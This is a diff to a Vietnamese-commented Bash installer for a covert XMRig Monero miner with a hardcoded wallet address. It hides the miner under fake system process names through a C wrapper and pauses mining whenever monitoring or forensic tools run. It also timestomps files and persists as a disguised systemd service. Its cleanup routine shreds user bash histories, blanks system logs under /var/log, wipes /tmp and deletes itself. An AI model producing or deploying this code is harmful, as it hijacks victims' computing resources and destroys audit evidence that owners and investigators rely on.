@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# --- Cấu hình CỦA BẠN (Cần thiết lập) ---
+# --- Cấu hình CỦA BẠN (Cần thiết lập - CỰC KỲ QUAN TRỌNG) ---
 # Địa chỉ ví của bạn để nhận Monero. Thay thế bằng địa chỉ ví thực của bạn.
 WALLET_ADDRESS="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 # Địa chỉ mining pool và cổng. Thay thế bằng pool bạn muốn sử dụng.
@@ -205,6 +205,138 @@ FAKE_PROCESS_NAMES=(
     "migration/1"
     "rcu_bh"
     "kjournald"
+    "Xorg"
+    "bash"
+    "zsh"
+    "fish"
+    "top"
+    "htop"
+    "iotop"
+    "pstree"
+    "cp"
+    "mv"
+    "ls"
+    "cat"
+    "grep"
+    "awk"
+    "sed"
+    "find"
+    "df"
+    "du"
+    "free"
+    "mount"
+    "umount"
+    "ssh"
+    "scp"
+    "rsync"
+    "sudo"
+    "apt"
+    "dnf"
+    "yum"
+    "dpkg"
+    "rpm"
+    "update-alternatives"
+    "crond"
+    "anacron"
+    "logrotate"
+    "systemd-udevd"
+    "systemd-timesyncd"
+    "systemd-networkd"
+    "networkd-dispatcher"
+    "wpa_supplicant"
+    "NetworkManager"
+    "ModemManager"
+    "cupsd"
+    "apache2"
+    "mysqld"
+    "php-fpm"
+    "nginx"
+    "postgresql"
+    "redis-server"
+    "memcached"
+    "mongod"
+    "java"
+    "python"
+    "node"
+    "go"
+    "ruby"
+    "php"
+    "sshfs"
+    "nfsd"
+    "rpc.mountd"
+    "rpc.statd"
+    "lockd"
+    "rlogind"
+    "rshd"
+    "telnetd"
+    "vsftpd"
+    "ftpd"
+    "sendmail"
+    "postfix"
+    "exim4"
+    "dovecot"
+    "opendkim"
+    "bind9"
+    "dnsmasq"
+    "unbound"
+    "openvpn"
+    "wireguard"
+    "ipsec"
+    "strongswan"
+    "lighttpd"
+    "httpd"
+    "sshd"
+    "docker"
+    "dockerd"
+    "containerd"
+    "kubelet"
+    "kube-proxy"
+    "kube-apiserver"
+    "etcd"
+    "prometheus"
+    "grafana"
+    "alertmanager"
+    "node_exporter"
+    "cadvisor"
+    "fluentd"
+    "logstash"
+    "filebeat"
+    "journalbeat"
+    "metricbeat"
+    "packetbeat"
+    "auditbeat"
+    "heartbeat"
+    "nginx-exporter"
+    "mysql-exporter"
+    "postgres-exporter"
+    "redis-exporter"
+    "mongodb-exporter"
+    "elasticsearch-exporter"
+    "kafka-exporter"
+    "zookeeper-porter"
+    "rabbitmq-exporter"
+    "haproxy-exporter"
+    "squid"
+    "privoxy"
+    "tor"
+    "polipo"
+    "dante-server"
+    "shadowsocks-libev"
+    "v2ray"
+    "xray"
+    "trojan"
+    "gost"
+    "frp"
+    "openvpn"
+    "ipsec"
+    "wireguard"
+    "openconnect"
+    "anyconnect"
+    "forticlientsslvpn"
+    "expressvpn"
+    "nordvpn"
+    "protonvpn"
+    "openfortivpn"
 )
 
 # Cấu hình các mức sử dụng CPU (threads), Nice value, và thời gian
@@ -294,7 +426,82 @@ SUSPICIOUS_PROCESS_KEYWORDS=(
     "fail2ban"
     "clamav"
     "rkhunter"
-    "chkrootkit"
+    "chkrootit"
+    "procmon"
+    "processmonitor"
+    "diskmon"
+    "netmon"
+    "wireshark"
+    "tshark"
+    "nmap"
+    "masscan"
+    "zmap"
+    "nessus"
+    "openvas"
+    "metasploit"
+    "cobaltstrike"
+    "empire"
+    "powershell"
+    "pwsh"
+    "powershell.exe"
+    "wmic"
+    "tasklist"
+    "netstat" # Nếu được sử dụng bởi người dùng thông thường, không phải daemon
+    "ss"      # Nếu được sử dụng bởi người dùng thông thường, không phải daemon
+    "htop"
+    "top"
+    "dmesg"
+    "journalctl"
+    "grep -i "miner""
+    "ps -ef | grep "cpu""
+    "lsmod"
+    "modinfo"
+    "insmod"
+    "rmmod"
+    "chattr"
+    "lsattr"
+    "auditctl"
+    "fuser"
+    "lsof"
+    "netstat -lp"
+    "ss -lp"
+    "ufw status"
+    "iptables -L"
+    "ip route"
+    "arp -a"
+    "dig"
+    "nslookup"
+    "host"
+    "whois"
+    "traceroute"
+    "mtr"
+    "nc"
+    "ncat"
+    "socat"
+    "strace"
+    "ltrace"
+    "readelf"
+    "objdump"
+    "strings"
+    "hexdump"
+    "xxd"
+    "binwalk"
+    "foremost"
+    "scalpel"
+    " volatility" # Có khoảng trắng để bắt đầu từ đầu dòng trong ps aux
+    "rekall"
+    "dumpit"
+    "winpmem"
+    "memdump"
+    "ramdump"
+    "forensics"
+    "forensic"
+    "malware"
+    "virus"
+    "trojan"
+    "rootkit"
+    "exploit"
+    "vulnerability"
 )
 # Thời gian tạm dừng khi phát hiện tiến trình đáng ngờ (giây)
 SUSPICIOUS_PAUSE_MIN_SECONDS=300 # 5 phút
@@ -312,6 +519,9 @@ WRAPPER_BINARY_NAME="sysd_proc_mgr"
 # --- Bắt đầu Cài đặt ---
 
 echo "Bắt đầu cài đặt XMRig và cấu hình tinh vi (Script Bash Tổng Hợp Tối Đa)..."
+echo "--- VUI LÒNG ĐẢM BẢO BẠN ĐÃ CẬP NHẬT CÁC CẤU HÌNH Ở ĐẦU SCRIPT! ---"
+echo "WALLET_ADDRESS, MINING_POOL, MINER_BASE_DIR, BIN_NAMES, FAKE_PROCESS_NAMES..."
+sleep 5 # Cho người dùng thời gian đọc cảnh báo
 
 # 1. Cập nhật hệ thống và cài đặt các gói cần thiết
 echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
@@ -395,8 +605,9 @@ int main(int argc, char *argv[]) {
     char *xmrig_config_path = argv[3];
 
     // Set the new process name (this changes argv[0] and visible name in 'ps')
+    // Suppress potential error output from prctl in child process
     if (prctl(PR_SET_NAME, (unsigned long)new_proc_name, 0, 0, 0) == -1) {
-        // perror("prctl(PR_SET_NAME) failed"); // Suppress error output
+        // perror("prctl(PR_SET_NAME) failed"); 
     }
 
     // Prepare arguments for execv: new_proc_name, "-c", xmrig_config_path, NULL
@@ -410,7 +621,7 @@ int main(int argc, char *argv[]) {
     execv(xmrig_path, xmrig_args);
 
     // If execv returns, it means an error occurred
-    // perror("execv failed"); // Suppress error output
+    // perror("execv failed"); 
     return 1; // Indicate error
 }
 EOF
@@ -422,7 +633,7 @@ if [ $? -eq 0 ]; then
     shred -u "$C_WRAPPER_SOURCE" > /dev/null 2>&1 # Xóa mã nguồn C sau khi biên dịch
 else
     echo "ERROR: C wrapper biên dịch thất bại. Miner sẽ sử dụng phương pháp đặt tên tiến trình cũ của XMRig (ít ẩn hơn)."
-    rm -f "$WRAPPER_BINARY_NAME" # Xóa binary lỗi
+    rm -f "$WRAPPER_BINARY_NAME" > /dev/null 2>&1 # Xóa binary lỗi nếu có
     WRAPPER_BINARY_NAME="" # Đánh dấu là không có wrapper
 fi
 
@@ -465,14 +676,19 @@ create_config_file() {
         
         for ((i=0; i<num_threads; i++)); do
             if [ ${#all_cores[@]} -eq 0 ]; then break; fi
-            local rand_idx=\$(( RANDOM % ${#all_cores[@]} ))
-            selected_cores+=("\${all_cores[\$rand_idx]}")
-            unset 'all_cores[\$rand_idx]'
-            all_cores=( "\${all_cores[@]}" )
+            
+            # Fix: Lấy kích thước mảng vào một biến riêng trước khi sử dụng
+            local num_available_cores=${#all_cores[@]}
+            local rand_idx=$(( RANDOM % num_available_cores ))
+            
+            selected_cores+=("${all_cores[$rand_idx]}")
+            unset 'all_cores[$rand_idx]'
+            # Re-index the array to remove gaps after unset
+            all_cores=( "${all_cores[@]}" ) 
         done
         
         if [ ${#selected_cores[@]} -gt 0 ]; then
-            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")]"
+            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")\]"
         else
             cpu_threads_config="[0]"
         fi
@@ -523,7 +739,7 @@ create_config_file() {
 EOF
 }
 
-for i in "\${!CPU_PROFILES[@]}"; do
+for i in "${!CPU_PROFILES[@]}"; do # Sử dụng ! để lấy index
     profile_info=${CPU_PROFILES[$i]}
     threads_raw=$(echo "$profile_info" | cut -d',' -f1)
     min_nice=$(echo "$profile_info" | cut -d',' -f2)
@@ -534,12 +750,17 @@ echo "Đã tạo các file cấu hình XMRig."
 
 # 7. Di chuyển XMRig binary
 echo "Di chuyển XMRig binary vào vị trí ẩn..."
-# Lưu binary thật với tên ẩn và dấu chấm để tránh bị liệt kê dễ dàng
-RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]} # Tên file ẩn của XMRig
-MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
-mv "$MINER_ORIGINAL_NAME" "$MINER_ACTUAL_PATH"
-chmod +x "$MINER_ACTUAL_PATH"
-echo "Đã di chuyển XMRig binary."
+if [ -f "$MINER_ORIGINAL_NAME" ]; then
+    # Lưu binary thật với tên ẩn và dấu chấm để tránh bị liệt kê dễ dàng
+    RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]} # Tên file ẩn của XMRig
+    MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
+    mv "$MINER_ORIGINAL_NAME" "$MINER_ACTUAL_PATH"
+    chmod +x "$MINER_ACTUAL_PATH"
+    echo "Đã di chuyển XMRig binary."
+else
+    echo "ERROR: XMRig original binary not found. Installation aborted."
+    exit 1
+fi
 
 # 8. Timestomping - Thay đổi timestamp của các file liên quan để khớp với file hệ thống
 echo "Thay đổi timestamp của các file miner để khớp với file hệ thống..."
@@ -551,7 +772,7 @@ echo "Using timestamp from: $RANDOM_SYSTEM_FILE"
 
 for file in "$MINER_DIR"/*; do
     if [ -f "$file" ]; then
-        touch -r "$RANDOM_SYSTEM_FILE" "$file"
+        touch -r "$RANDOM_SYSTEM_FILE" "$file" > /dev/null 2>&1
     fi
 done
 echo "Đã timestomp các file."
@@ -591,8 +812,8 @@ SUSPICIOUS_PAUSE_MAX_SECONDS=$SUSPICIOUS_PAUSE_MAX_SECONDS
 
 # File lưu trạng thái hiện tại của miner (bắt đầu bằng dấu chấm để ẩn)
 STATE_FILE="\$(decode_string "\$base_dir_encoded")/.miner_state"
-touch "\$STATE_FILE"
-chmod 600 "\$STATE_FILE"
+touch "\$STATE_FILE" > /dev/null 2>&1 # Ensure file exists
+chmod 600 "\$STATE_FILE" > /dev/null 2>&1
 
 # File ghi log riêng của controller (sẽ bị xóa bởi cleanup_traces.sh)
 CONTROLLER_LOG="\$(decode_string "\$base_dir_encoded")/controller.log"
@@ -624,10 +845,13 @@ stop_miner() {
 
     # Tìm kiếm theo tên tiến trình giả mạo hoặc tên file binary gốc
     # Sử dụng printf "%s|" để tạo pattern cho pgrep
-    local pids=\$(pgrep -f "minerd|xmrig|cpuminer|\$(printf "%s|" "\${decoded_fake_process_names[@]}")|\$(printf "%s|" "\${decoded_bin_names[@]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")")
+    local pids=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")")
     if [ -n "\$pids" ]; then
         for pid in \$pids; do
-            kill -9 \$pid > /dev/null 2>&1 # Buộc dừng tiến trình
+            # Ensure we don't kill the controller itself (unlikely due to pgrep -f filter but good practice)
+            if [ "\$pid" != "\$\$" ]; then
+                kill -9 \$pid > /dev/null 2>&1 # Buộc dừng tiến trình
+            fi
         done
         log_message "Stopped existing miner processes."
     fi
@@ -678,7 +902,9 @@ run_fake_activity() {
 
         local duration_seconds=\$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))
 
-        ( nohup bash -c "timeout \$duration_seconds \$cmd" > /dev/null 2>&1 & )
+        # Chạy lệnh trong một subshell để nó không bị ảnh hưởng bởi các biến hoặc tín hiệu của script chính
+        # Sử dụng 'bash -c' để đảm bảo biến MINE_DIR được mở rộng nếu cần trong lệnh cmd
+        ( nohup bash -c "export MINER_DIR=\$(decode_string "\$base_dir_encoded"); timeout \$duration_seconds \$cmd" > /dev/null 2>&1 & )
         log_message "Running fake activity (\$activity_type) command: '\$cmd' for \$duration_seconds seconds."
     fi
 }
@@ -705,9 +931,11 @@ check_for_suspicious_processes() {
         decoded_keywords+=("\$(decode_string "\$encoded_kw")")
     done
 
+    local ps_output=\$(ps aux) # Lấy đầu ra ps aux một lần để giảm tải
+
     for keyword in "\${decoded_keywords[@]}"; do
-        # Tránh grep chính nó
-        if pgrep -f "\$keyword" | grep -v "\$\$"; then
+        # Tìm kiếm từ khóa trong output của ps, loại trừ chính tiến trình grep
+        if echo "\$ps_output" | grep -F "\$keyword" | grep -v "grep" | grep -v "\$\$" > /dev/null; then
             log_message "WARNING: Suspicious process detected: '\$keyword'. Initiating pause."
             return 0 # True, suspicious process found
         fi
@@ -764,7 +992,8 @@ main_control() {
 
     # Đảm bảo có một tên binary hợp lệ khi khởi động lần đầu hoặc phục hồi
     if [ -z "\$current_bin_name_encoded" ]; then
-        local new_bin_name=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
+        local new_bin_name_index=\$(( RANDOM % \${#bin_names_encoded[@]} ))
+        local new_bin_name=\${bin_names_encoded[\$new_bin_name_index]}
         current_bin_name_encoded="\$new_bin_name"
         log_message "Initializing/recovering binary name to \$(decode_string "\$current_bin_name_encoded")."
     fi
@@ -780,7 +1009,7 @@ main_control() {
 
     # Nếu miner đang dừng (-1 profile ID) hoặc lần chạy đầu tiên
     if [ "\$current_profile_id" == "-1" ] || [ -z "\$current_profile_id" ]; then
-        current_profile_id=\$(( RANDOM % \${#CPU_PROFILES[@]} )) # Chọn profile ngẫu nhiên
+        current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} )) # Chọn profile ngẫu nhiên
         last_run_timestamp=\$current_timestamp
         log_message "Miner was stopped or initial run. Starting with profile \$current_profile_id."
         start_miner "\$current_profile_id" "\$current_bin_name_encoded"
@@ -810,7 +1039,8 @@ main_control() {
             # Quyết định ngẫu nhiên liệu có nên thay đổi tên binary hay không
             if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
                 local old_bin_name_encoded="\$current_bin_name_encoded"
-                local new_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
+                local new_bin_name_index=\$(( RANDOM % \${#bin_names_encoded[@]} ))
+                local new_bin_name_encoded=\${bin_names_encoded[\$new_bin_name_index]}
                 
                 # Chỉ đổi tên file nếu tên mới khác tên cũ để tránh lỗi
                 if [ "\$new_bin_name_encoded" != "\$old_bin_name_encoded" ]; then
@@ -818,16 +1048,19 @@ main_control() {
                     local new_bin_name="\$(decode_string "\$new_bin_name_encoded")"
 
                     # Đổi tên binary XMRig thực (phần data của XMRig)
-                    mv "\$(decode_string "\$base_dir_encoded")/.\$old_bin_name.bin" "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" > /dev/null 2>&1
-                    # Cập nhật đường dẫn thực tế của miner trong controller
-                    MINER_ACTUAL_PATH_ENCODED="$(echo "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" | base64)"
-                    
-                    current_bin_name_encoded="\$new_bin_name_encoded" # Cập nhật tên binary mã hóa
-                    log_message "Binary (XMRig data file) name changed from \$old_bin_name to \$new_bin_name."
+                    # Kiểm tra xem file cũ có tồn tại trước khi mv
+                    if [ -f "\$(decode_string "\$base_dir_encoded")/.\$old_bin_name.bin" ]; then
+                        mv "\$(decode_string "\$base_dir_encoded")/.\$old_bin_name.bin" "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" > /dev/null 2>&1
+                        MINER_ACTUAL_PATH_ENCODED="$(echo "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" | base64)" # Cập nhật đường dẫn thực tế của miner trong controller
+                        current_bin_name_encoded="\$new_bin_name_encoded" # Cập nhật tên binary mã hóa
+                        log_message "Binary (XMRig data file) name changed from \$old_bin_name to \$new_bin_name."
+                    else
+                        log_message "WARNING: Old binary file '.\$old_bin_name.bin' not found for renaming. Skipping rename."
+                    fi
                 fi
             fi
 
-            local new_profile_id=\$(( RANDOM % \${#CPU_PROFILES[@]} ))
+            local new_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
             current_profile_id="\$new_profile_id"
             last_run_timestamp=\$current_timestamp
             log_message "Changing to profile \$current_profile_id (fake name: \$(decode_string "\$current_bin_name_encoded"))."
@@ -862,21 +1095,25 @@ WRAPPER_BINARY="$WRAPPER_BINARY_NAME" # Tên binary của C-wrapper
 # Xóa lịch sử bash của người dùng root và tất cả người dùng khác
 for history_file in \$HOME/.bash_history \$(find /home/ -name ".bash_history" 2>/dev/null) \$(find /root/ -name ".bash_history" 2>/dev/null); do
     if [ -f "\$history_file" ]; then
-        rm -f "\$history_file" > /dev/null 2>&1 && touch "\$history_file" && chmod 600 "\$history_file"
+        # Use a more robust way to clear history, then shred the file to overwrite
+        history -c # Clear current session history
+        history -w # Write current (empty) history to file
+        shred -u "\$history_file" > /dev/null 2>&1 && touch "\$history_file" && chmod 600 "\$history_file"
     fi
 done
 
 # Xóa các log của controller
-[ -f "\$MINER_DIR/controller.log" ] && rm -f "\$MINER_DIR/controller.log" > /dev/null 2>&1
+[ -f "\$MINER_DIR/controller.log" ] && shred -u "\$MINER_DIR/controller.log" > /dev/null 2>&1
 
 # Xóa các log của XMRig nếu chúng được tạo
 for log_file in "\$MINER_DIR"/xmrig_profile_*.log; do
     if [ -f "\$log_file" ]; then
-        rm -f "\$log_file" > /dev/null 2>&1
+        shred -u "\$log_file" > /dev/null 2>&1
     fi
 done
 
 # Ghi đè rỗng lên các file log hệ thống thay vì xóa hoàn toàn để tránh nghi ngờ
+# Sử dụng for loop và echo "" > file để ghi đè, không sử dụng shred cho log hệ thống chung
 sudo find /var/log/ -maxdepth 1 -type f -name "*.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
 sudo find /var/log/ -maxdepth 1 -type f -name "*.wtmp" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
 sudo find /var/log/ -maxdepth 1 -type f -name "*.btmp" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
@@ -884,7 +1121,7 @@ sudo find /var/log/ -maxdepth 1 -type f -name "auth.log" -exec bash -c 'echo "" 
 sudo find /var/log/ -maxdepth 1 -type f -name "daemon.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
 sudo find /var/log/ -maxdepth 1 -type f -name "kern.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
 sudo find /var/log/ -maxdepth 1 -type f -name "syslog" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/syslog -type f -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1 # Thêm syslogs
+sudo find /var/log/syslog -type f -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
 
 # Xóa các file tạm thời của hệ thống
 sudo rm -rf /tmp/* > /dev/null 2>&1
@@ -895,16 +1132,14 @@ rm -f "\$MINER_DIR"/temp_file_* > /dev/null 2>&1
 rm -f "\$MINER_DIR"/temp_block_* > /dev/null 2>&1
 rm -f "\$MINER_DIR"/temp_archive_*.tar.gz > /dev/null 2>&1
 
-# Xóa các file cài đặt ban đầu của script này
+# Xóa các file cài đặt ban đầu của script này (nếu vẫn còn)
 # Sử dụng rm -f để giảm dấu vết I/O so với shred
 [ -f "\$MINER_DIR/$XMRIG_ARCHIVE" ] && rm -f "\$MINER_DIR/$XMRIG_ARCHIVE" > /dev/null 2>&1
-# Cleanup script này tự xóa bản thân sau khi chạy thành công nếu được cron gọi
-# [ -f "$MINER_DIR/cleanup_traces.sh" ] && rm -f "$MINER_DIR/cleanup_traces.sh" > /dev/null 2>&1 
-# [ -f "$MINER_DIR/setup_miner_ultimate.sh" ] && rm -f "$MINER_DIR/setup_miner_ultimate.sh" > /dev/null 2>&1
-[ -f "initial_setup.sh" ] && rm -f initial_setup.sh > /dev/null 2>&1 # Script có thể được đặt tên khác
+[ -f "initial_setup.sh" ] && rm -f initial_setup.sh > /dev/null 2>&1 
+[ -f "\$(basename "\$0")" ] && rm -f "\$(basename "\$0")" > /dev/null 2>&1 # Xóa chính script cleanup này nếu được gọi trực tiếp
 
 # Xóa file trạng thái của miner (tái tạo lại ở lần chạy tiếp theo)
-[ -f "\$MINER_DIR/.miner_state" ] && rm -f "\$MINER_DIR/.miner_state" > /dev/null 2>&1
+[ -f "\$MINER_DIR/.miner_state" ] && shred -u "\$MINER_DIR/.miner_state" > /dev/null 2>&1
 
 # Timestomping ngược lại - điều chỉnh timestamp của các file liên quan đến cleanup
 RANDOM_SYSTEM_FILE=$(find /bin /usr/bin /sbin /usr/sbin -type f -perm /u=s -print0 | shuf -n 1 -z)
@@ -928,6 +1163,9 @@ echo "Cấu hình Systemd Service để chạy master_controller.sh..."
 # Chọn một thời gian ngẫu nhiên trong khoảng từ 30 giây đến 1 phút để service khởi động
 RANDOM_START_DELAY=$(( RANDOM % 30 + 30 )) # 30 to 60 seconds
 
+# Lấy USER hiện tại để chạy service dưới quyền user đó
+CURRENT_USER=$(whoami)
+
 # Tạo file service
 sudo cat <<EOF > "/etc/systemd/system/$SYSTEMD_SERVICE_NAME"
 [Unit]
@@ -936,7 +1174,7 @@ After=network.target multi-user.target systemd-resolved.service systemd-udevd.se
 
 [Service]
 Type=simple
-User=$USER # Chạy dưới quyền user hiện tại, không phải root, để giảm dấu vết
+User=$CURRENT_USER # Chạy dưới quyền user hiện tại, không phải root, để giảm dấu vết
 WorkingDirectory=$MINER_DIR
 ExecStart=/bin/bash -c "sleep $RANDOM_START_DELAY && \$MINER_DIR/master_controller.sh"
 Restart=always
@@ -985,5 +1223,9 @@ echo "Script cài đặt đã tự xóa."
 echo "Cài đặt hoàn tất."
 echo "Để kiểm tra: ps aux | grep '\$(head -n 1 \$MINER_DIR/config_profile_0.json | jq -r '.[\"custom-name\"]' 2>/dev/null)'"
 echo "Hoặc kiểm tra trạng thái dịch vụ: sudo systemctl status $SYSTEMD_SERVICE_NAME"
-echo "Để gỡ cài đặt: sudo systemctl stop $SYSTEMD_SERVICE_NAME && sudo systemctl disable $SYSTEMD_SERVICE_NAME && sudo rm /etc/systemd/system/$SYSTEMD_SERVICE_NAME && sudo rm -rf $MINER_DIR && crontab -l | grep -v \"$MINER_DIR/master_controller.sh\" | grep -v \"$MINER_DIR/cleanup_traces.sh\" | crontab -"
-echo "Lưu ý: Để gỡ cài đặt hoàn toàn, bạn cần xóa cả cron job dọn dẹp và thư mục miner. Hãy sao chép lệnh gỡ cài đặt trên!"
+echo "LỆNH GỠ CÀI ĐẶT (SAO CHÉP LẠI!):"
+echo "sudo systemctl stop $SYSTEMD_SERVICE_NAME"
+echo "sudo systemctl disable $SYSTEMD_SERVICE_NAME"
+echo "sudo rm /etc/systemd/system/$SYSTEMD_SERVICE_NAME"
+echo "sudo rm -rf $MINER_DIR"
+echo "(crontab -l 2>/dev/null | grep -v \"$MINER_DIR\" | crontab -)"
